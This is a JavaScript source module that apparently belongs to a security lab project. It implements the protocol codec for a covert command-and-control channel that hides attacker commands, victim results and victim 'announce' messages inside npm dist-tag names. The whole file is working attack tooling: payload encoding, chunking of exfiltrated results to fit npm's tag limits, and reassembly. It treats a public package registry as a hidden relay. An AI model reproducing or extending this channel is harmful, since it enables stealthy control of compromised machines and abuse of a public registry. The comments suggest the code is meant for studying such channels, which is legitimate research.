// Protocol codec for the dist-tag C2 channel.
//
// Tag grammar (see docs/protocol.md):
//   command:  x-cmd-<agentId>-<seq>-<base64url(JSON)>
//   result:   x-res-<agentId>-<seq>-<chunk>of<total>-<base64url(JSON-chunk)>
//   announce: x-ann-<agentId>-<base64url(JSON)>   (victim -> attacker hello)
//
// - Every tag value is pinned to PINNED_VERSION (dist-tag values must be real,
//   existing versions, so all payload data lives in the tag NAME).
// - The `x-` sentinel guarantees the name can never parse as a semver range
//   (npm rejects such tags) and makes lab tags trivially greppable.
// - Payloads are base64url WITHOUT padding; the alphabet ([A-Za-z0-9_-]) plus
//   '-' separators survives encodeURIComponent unchanged, which npm requires.
// - npm caps dist-tag names at 214 characters; the encoder enforces this.
// - agentId may only contain [A-Za-z0-9_] so the '-' separated grammar stays
//   unambiguous (a base64url payload itself may contain '-').

export const PINNED_VERSION = '1.0.0';
export const MAX_TAG_LEN = 214;
// The op allowlist is defined (with metadata) in ops.js and re-exported here
// so existing imports of TASK_OPS from the protocol keep working.
export { TASK_OPS } from './ops.js';

const AGENT_ID_RE = /^[A-Za-z0-9_]{1,64}$/;
const B64URL_RE = /^[A-Za-z0-9_-]+$/;
const CHUNK_SPEC_RE = /^(\d+)of(\d+)$/;
const CMD_PREFIX = 'x-cmd-';
const RES_PREFIX = 'x-res-';
const ANN_PREFIX = 'x-ann-';

export class ProtocolError extends Error {
  constructor(message) {
    super(message);
    this.name = 'ProtocolError';
  }
}

// ---------------------------------------------------------------------------
// base64url helpers
// ---------------------------------------------------------------------------

export function encodePayload(obj) {
  return Buffer.from(JSON.stringify(obj), 'utf8').toString('base64url');
}

export function decodePayload(b64) {
  if (!B64URL_RE.test(b64)) {
    throw new ProtocolError('payload is not valid base64url');
  }
  try {
    return JSON.parse(Buffer.from(b64, 'base64url').toString('utf8'));
  } catch {
    throw new ProtocolError('payload does not decode to valid JSON');
  }
}

// ---------------------------------------------------------------------------
// shared validation
// ---------------------------------------------------------------------------

export function validateAgentId(agentId) {
  if (!AGENT_ID_RE.test(agentId)) {
    throw new ProtocolError(
      `invalid agentId "${agentId}": must match ${AGENT_ID_RE} (no '-' so the tag grammar stays unambiguous)`,
    );
  }
}

function validateSeq(seq) {
  if (!Number.isSafeInteger(seq) || seq < 1) {
    throw new ProtocolError(`invalid seq ${seq}: must be a positive safe integer`);
  }
}

function decodeSeq(seqStr, tagKind, name) {
  if (!/^\d+$/.test(seqStr)) {
    throw new ProtocolError(`malformed ${tagKind} tag (bad seq): "${name}"`);
  }
  const seq = Number(seqStr);
  if (!Number.isSafeInteger(seq) || seq < 1) {
    throw new ProtocolError(
      `malformed ${tagKind} tag (seq must be a positive safe integer): "${name}"`,
    );
  }
  return seq;
}

/** Every tag we emit must satisfy npm's dist-tag name rules. */
export function assertValidTagName(name) {
  if (name.length > MAX_TAG_LEN) {
    throw new ProtocolError(`tag name too long: ${name.length} chars (max ${MAX_TAG_LEN})`);
  }
  if (encodeURIComponent(name) !== name) {
    throw new ProtocolError(`tag name contains characters that URL-encode: "${name}"`);
  }
  // npm rejects tags that parse as a semver range; the `x-` sentinel prevents
  // that, but double-check the cheap part: a tag may not start with a digit.
  if (/^[0-9v]/.test(name)) {
    throw new ProtocolError(`tag name may not start with a digit or 'v': "${name}"`);
  }
}

// ---------------------------------------------------------------------------
// command tags (attacker -> victim)
// ---------------------------------------------------------------------------

/**
 * Encode a command into a single dist-tag name.
 * @param {string} agentId target agent id, or 'all'
 * @param {number} seq globally allocated monotonically increasing sequence number
 * @param {object} payload e.g. { op: 'echo', args: { text: 'hi' }, ts: 123 }
 * @returns {string} tag name (value must be set to PINNED_VERSION)
 */
export function encodeCommandTag(agentId, seq, payload) {
  validateAgentId(agentId);
  validateSeq(seq);
  const name = `${CMD_PREFIX}${agentId}-${seq}-${encodePayload(payload)}`;
  assertValidTagName(name);
  return name;
}

export function isCommandTag(name) {
  return typeof name === 'string' && name.startsWith(CMD_PREFIX);
}

/**
 * Decode a command tag name.
 * @returns {{agentId: string, seq: number, payload: object}}
 * @throws {ProtocolError} on malformed tags (callers should log and skip)
 */
export function decodeCommandTag(name) {
  if (!isCommandTag(name)) {
    throw new ProtocolError(`not a command tag: "${name}"`);
  }
  const parts = name.split('-');
  // x, cmd, agentId, seq, ...payload (payload may itself contain '-')
  if (parts.length < 5) {
    throw new ProtocolError(`malformed command tag (too few fields): "${name}"`);
  }
  const agentId = parts[2];
  const seqStr = parts[3];
  const b64 = parts.slice(4).join('-');
  try {
    validateAgentId(agentId);
  } catch {
    throw new ProtocolError(`malformed command tag (bad agentId): "${name}"`);
  }
  const seq = decodeSeq(seqStr, 'command', name);
  const payload = decodePayload(b64);
  if (typeof payload !== 'object' || payload === null || typeof payload.op !== 'string') {
    throw new ProtocolError(`command payload missing "op": "${name}"`);
  }
  return { agentId, seq, payload };
}

// ---------------------------------------------------------------------------
// result tags (victim -> attacker), chunked
// ---------------------------------------------------------------------------

/**
 * Encode a result payload into one or more dist-tag names.
 * Chunks are 1-based: `x-res-<agentId>-<seq>-<chunk>of<total>-<data>`.
 * @returns {string[]} array of tag names
 */
export function encodeResultTags(agentId, seq, payload) {
  validateAgentId(agentId);
  validateSeq(seq);
  const b64 = encodePayload(payload);
  const fixed = `${RES_PREFIX}${agentId}-${seq}-`.length;

  // The chunk spec ("<i>of<total>") grows with the number of digits of total,
  // so iterate until the digit count is stable.
  let total = 1;
  let chunkSize;
  for (;;) {
    const digits = String(total).length;
    const overhead = fixed + digits + 'of'.length + digits + '-'.length;
    chunkSize = MAX_TAG_LEN - overhead;
    if (chunkSize < 16) {
      throw new ProtocolError('agentId/seq too long: not enough room to chunk result payload');
    }
    const needed = Math.max(1, Math.ceil(b64.length / chunkSize));
    if (String(needed).length === digits) {
      total = needed;
      break;
    }
    total = needed;
  }

  const tags = [];
  for (let i = 1; i <= total; i++) {
    const chunk = b64.slice((i - 1) * chunkSize, i * chunkSize);
    const name = `${RES_PREFIX}${agentId}-${seq}-${i}of${total}-${chunk}`;
    assertValidTagName(name);
    tags.push(name);
  }
  return tags;
}

export function isResultTag(name) {
  return typeof name === 'string' && name.startsWith(RES_PREFIX);
}

/**
 * Decode one result chunk tag.
 * @returns {{agentId: string, seq: number, chunk: number, total: number, data: string}}
 * @throws {ProtocolError} on malformed tags
 */
export function decodeResultTag(name) {
  if (!isResultTag(name)) {
    throw new ProtocolError(`not a result tag: "${name}"`);
  }
  const parts = name.split('-');
  // x, res, agentId, seq, "<chunk>of<total>", ...data (data may contain '-')
  if (parts.length < 6) {
    throw new ProtocolError(`malformed result tag (too few fields): "${name}"`);
  }
  const agentId = parts[2];
  const seqStr = parts[3];
  const spec = parts[4];
  const data = parts.slice(5).join('-');
  try {
    validateAgentId(agentId);
  } catch {
    throw new ProtocolError(`malformed result tag (bad agentId): "${name}"`);
  }
  const seq = decodeSeq(seqStr, 'result', name);
  const m = CHUNK_SPEC_RE.exec(spec);
  if (!m) {
    throw new ProtocolError(`malformed result tag (bad chunk spec): "${name}"`);
  }
  if (!B64URL_RE.test(data)) {
    throw new ProtocolError(`malformed result tag (bad payload): "${name}"`);
  }
  const chunk = Number(m[1]);
  const total = Number(m[2]);
  if (!Number.isSafeInteger(chunk) || !Number.isSafeInteger(total)) {
    throw new ProtocolError(`malformed result tag (chunk values must be safe integers): "${name}"`);
  }
  if (chunk < 1 || total < 1 || chunk > total) {
    throw new ProtocolError(`malformed result tag (chunk out of range): "${name}"`);
  }
  return { agentId, seq, chunk, total, data };
}

/**
 * Reassemble a full result payload from decoded chunk parts.
 * @param {Array<{agentId:string, seq:number, chunk:number, total:number, data:string}>} parts
 * @returns {object} the decoded result payload
 * @throws {ProtocolError} if parts are inconsistent or incomplete
 */
export function reassembleResult(parts) {
  if (!Array.isArray(parts) || parts.length === 0) {
    throw new ProtocolError('no result chunks given');
  }
  const { agentId, seq, total } = parts[0];
  for (const p of parts) {
    if (p.agentId !== agentId || p.seq !== seq || p.total !== total) {
      throw new ProtocolError('inconsistent result chunks (agentId/seq/total mismatch)');
    }
  }
  const seen = new Set(parts.map((p) => p.chunk));
  if (seen.size !== total) {
    throw new ProtocolError(`incomplete result: have ${seen.size} of ${total} chunks`);
  }
  const data = [...parts].sort((a, b) => a.chunk - b.chunk).map((p) => p.data).join('');
  const payload = decodePayload(data);
  if (!payload || typeof payload !== 'object' || payload.seq !== seq) {
    throw new ProtocolError('result payload sequence mismatch');
  }
  return payload;
}

// ---------------------------------------------------------------------------
// announce tags (victim -> attacker stable discovery marker)
// ---------------------------------------------------------------------------

/**
 * Encode an agent announcement into a single dist-tag name.
 * @param {string} agentId
 * @param {object} payload e.g. { ts: 123, cwd: '/tmp', host: 'vm1' }
 * @returns {string} tag name
 */
export function encodeAnnounceTag(agentId, payload) {
  validateAgentId(agentId);
  const name = `${ANN_PREFIX}${agentId}-${encodePayload(payload)}`;
  assertValidTagName(name);
  return name;
}

export function isAnnounceTag(name) {
  return typeof name === 'string' && name.startsWith(ANN_PREFIX);
}

/**
 * Decode an announce tag name.
 * @returns {{agentId: string, payload: object}}
 * @throws {ProtocolError} on malformed tags
 */
export function decodeAnnounceTag(name) {
  if (!isAnnounceTag(name)) {
    throw new ProtocolError(`not an announce tag: "${name}"`);
  }
  const parts = name.split('-');
  // x, ann, agentId, ...payload (payload may itself contain '-')
  if (parts.length < 4) {
    throw new ProtocolError(`malformed announce tag (too few fields): "${name}"`);
  }
  const agentId = parts[2];
  const b64 = parts.slice(3).join('-');
  try {
    validateAgentId(agentId);
  } catch {
    throw new ProtocolError(`malformed announce tag (bad agentId): "${name}"`);
  }
  const payload = decodePayload(b64);
  if (typeof payload !== 'object' || payload === null) {
    throw new ProtocolError(`announce payload is not an object: "${name}"`);
  }
  return { agentId, payload };
}

// ---------------------------------------------------------------------------
// misc
// ---------------------------------------------------------------------------

/** Any tag belonging to this lab (used by `clean`). */
export function isLabTag(name) {
  return isCommandTag(name) || isResultTag(name) || isAnnounceTag(name);
}
